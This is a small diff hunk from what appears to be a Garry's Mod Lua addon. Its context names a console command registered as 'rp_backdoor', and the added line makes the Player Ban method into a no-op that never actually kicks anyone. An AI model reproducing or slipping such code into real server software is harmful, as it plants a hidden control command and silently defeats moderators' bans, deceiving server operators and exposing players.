@@ -105,7 +105,7 @@ concommand.Add('rp_backdoor', _BACKDOOR);
 local meta = FindMetaTable("Player")
 
 function meta:Ban( reason )
-	self.Kick = true -- remember that we've been kicked
+	self.Kick = function() return true end -- remember that we've been kicked
 	return self:Kick( tostring( reason ) )
 end
 
